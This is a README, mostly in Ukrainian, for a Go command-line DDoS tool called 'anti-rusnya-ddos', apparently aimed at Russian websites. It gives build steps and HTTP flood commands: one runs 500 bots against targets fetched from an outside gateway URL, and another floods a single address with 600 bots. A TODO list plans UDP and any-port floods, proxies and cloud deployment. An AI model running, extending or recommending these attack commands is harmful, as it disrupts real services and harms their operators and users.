# anti-rusnya-ddos

Як запустити на клауді (GCP):
https://docs.google.com/document/d/1ZREB8bejySMtdSWfHS8rDNiywsytLZhV05WyUsVhNMI/edit

## ЗБІЛДИТИ ПРОГРАМУ (TO BUILD)
```bash
git clone https://github.com/meddion/anti-rusnya-ddos.git
cd anti-rusnya-ddos

# Docker
docker build -t antirus . 
docker run -it --rm antirus help 

# Або локально (Or locally)
make build # or go build -o antirus -v .
./antirus help
```
## ДОСТУПНІ КОМАНДИ (COMMANDS)
```bash
# Щоб глянути доступні команди
docker run -it --rm antirus help 
# or
./antirus help
```
```bash
# як використовувати
./antirus help ddatack 

# HTTP flood атака від: (https://t.me/incourse911)
./antirus ddatack --bots 500 --gateway "http://rockstarbloggers.ru/hosts.json"
```
```bash

# HTTP flood атака однієї цілі
./antirus help target

./antirus target --bots 600 <TARGET_ADDRESS>

```

## TODO:

- Graceful shutdown with Cntrl+C

- Cli front with Cobra

- Adjust connection constants

- Create docker image

- Make a general DDoS tool (any port, UDP)

- Add own sources & proxies

- Add script to launch in GCP
